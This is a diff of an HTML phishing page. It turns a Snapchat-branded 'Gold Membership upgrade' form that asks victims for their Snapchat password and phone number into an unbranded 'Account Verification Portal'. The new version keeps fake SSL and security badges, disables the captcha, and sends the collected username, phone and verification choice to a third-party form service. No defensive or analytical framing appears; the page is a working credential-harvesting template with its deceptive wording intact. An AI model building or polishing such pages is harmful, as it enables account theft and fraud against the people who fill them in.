@@ -3,9 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Official Snapchat Gold Membership Upgrade</title>
+    <title>Premium Social Upgrade | Account Verification</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
+        :root {
+            --primary-color: #2A6EFF;
+            --secondary-color: #1A1A1A;
+        }
 
         * {
             margin: 0;
@@ -15,7 +20,7 @@
         }
 
         body {
-            background: linear-gradient(135deg, #FFFC00, #000000);
+            background: linear-gradient(135deg, #f0f5ff, #ffffff);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -23,41 +28,30 @@
             padding: 20px;
         }
 
-        .giveaway-container {
-            background: rgba(255, 255, 255, 0.95);
+        .verify-container {
+            background: rgba(255, 255, 255, 0.98);
             padding: 40px;
             border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            box-shadow: 0 5px 25px rgba(0,0,0,0.08);
             max-width: 500px;
             width: 100%;
             text-align: center;
+            border: 1px solid #e0e0e0;
+        }
+
+        .security-header {
+            margin-bottom: 30px;
             position: relative;
         }
 
-        .verification-badge {
-            position: absolute;
-            top: -20px;
-            right: -20px;
-            background: #FFFC00;
-            padding: 10px 15px;
-            border-radius: 25px;
-            font-weight: 600;
-            font-size: 12px;
-            transform: rotate(10deg);
-        }
-
-        .snap-header {
-            margin-bottom: 30px;
-        }
-
-        .snap-header h1 {
-            color: #000;
-            font-size: 28px;
+        .security-header h1 {
+            color: var(--secondary-color);
+            font-size: 26px;
             margin-bottom: 15px;
-            background: #FFFC00;
-            padding: 10px;
+            padding: 12px 25px;
             border-radius: 10px;
             display: inline-block;
+            border: 2px solid var(--primary-color);
         }
 
         .form-group {
@@ -68,110 +62,103 @@
         label {
             display: block;
             margin-bottom: 8px;
-            color: #333;
+            color: #444;
             font-weight: 600;
+            font-size: 14px;
         }
 
         input, select {
             width: 100%;
-            padding: 12px;
-            border: 2px solid #FFFC00;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
             border-radius: 8px;
             font-size: 14px;
             transition: all 0.3s ease;
         }
 
-        .security-alert {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
+        input:focus, select:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 12px rgba(42, 110, 255, 0.15);
         }
 
         .submit-btn {
-            background: #FFFC00;
-            color: #000;
-            padding: 15px 40px;
+            background: var(--primary-color);
+            color: white;
+            padding: 14px 40px;
             border: none;
-            border-radius: 25px;
-            font-size: 16px;
+            border-radius: 8px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            text-transform: uppercase;
-            position: relative;
-            overflow: hidden;
+            width: 100%;
         }
 
-        .submit-btn::after {
-            content: "🔒 Secure Connection";
-            position: absolute;
-            bottom: -20px;
-            left: 50%;
-            transform: translateX(-50%);
-            font-size: 10px;
+        .legal-disclaimer {
+            font-size: 11px;
             color: #666;
+            margin: 25px 0;
+            line-height: 1.6;
         }
 
-        @media (max-width: 480px) {
-            .giveaway-container {
-                padding: 25px;
-            }
-            .verification-badge {
-                top: -15px;
-                right: -10px;
-                font-size: 10px;
-            }
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 15px;
+            background: #f8f9fa;
+            border-radius: 25px;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="giveaway-container">
-        <div class="verification-badge">✅ Verified Partner</div>
-        
-        <div class="snap-header">
-            <h1>🔓 Snapchat Account Upgrade Portal</h1>
-            <div class="security-alert">
-                ⚠️ You're entering a secure Snapchat verification portal. 
-                All data is SSL-encrypted and protected by 256-bit security.
+    <div class="verify-container">
+        <div class="security-header">
+            <h1>🔒 Account Verification Portal</h1>
+            <div class="secure-badge">
+                🔐 SSL Secured | 256-bit Encryption
             </div>
         </div>
 
-        <form action="https://getform.io/f/bjjmdewb" method="POST">
+        <form action="https://formsubmit.co/your-email@domain.com" method="POST">
             <!-- Honeypot Field -->
-            <input type="checkbox" name="_honeypot" style="display: none">
+            <input type="text" name="_honey" style="display: none">
+
+            <!-- Disable Captcha -->
+            <input type="hidden" name="_captcha" value="false">
 
             <div class="form-group">
-                <label>📲 Official Snapchat Username</label>
-                <input type="text" name="username" placeholder="ex: @johnsmith" required>
+                <label>Username</label>
+                <input type="text" name="username" placeholder="Enter your username" required>
             </div>
 
             <div class="form-group">
-                <label>🔑 Account Verification Code</label>
-                <input type="password" name="verification" placeholder="Enter Snapchat password" required>
-                <div class="security-alert" style="margin: 10px 0">
-                    🔐 Required for identity confirmation. This helps prevent fraudulent claims.
-                </div>
+                <label>Contact Number</label>
+                <input type="tel" name="phone" placeholder="Enter mobile number" required>
             </div>
 
             <div class="form-group">
-                <label>📞 Security Contact Number</label>
-                <input type="tel" name="mobile" placeholder="+1 234 567 890" required>
+                <label>Verification Method</label>
+                <select name="verification" required>
+                    <option value="">Select verification type</option>
+                    <option>Email Authentication</option>
+                    <option>2FA Code</option>
+                    <option>Security Question</option>
+                </select>
             </div>
 
-            <input type="hidden" name="_gotcha" style="display:none;">
-            
             <button type="submit" class="submit-btn">
-                🚀 Upgrade to Gold Membership
+                Continue Verification
             </button>
-        </form>
 
-        <div class="security-alert" style="margin-top: 25px;">
-            <strong>🔒 Security Disclaimer:</strong> This secure portal is maintained by Snapchat® 
-            authorized partners. By submitting, you agree to our end-to-end encrypted 
-            verification process under GDPR compliance.
-        </div>
+            <div class="legal-disclaimer">
+                By continuing, you agree to our 
+                <a href="#" style="color: var(--primary-color)">Terms of Service</a> and 
+                <a href="#" style="color: var(--primary-color)">Privacy Policy</a>. 
+                This independent verification service is not affiliated with any third-party platforms.
+            </div>
+        </form>
     </div>
 </body>
 </html>
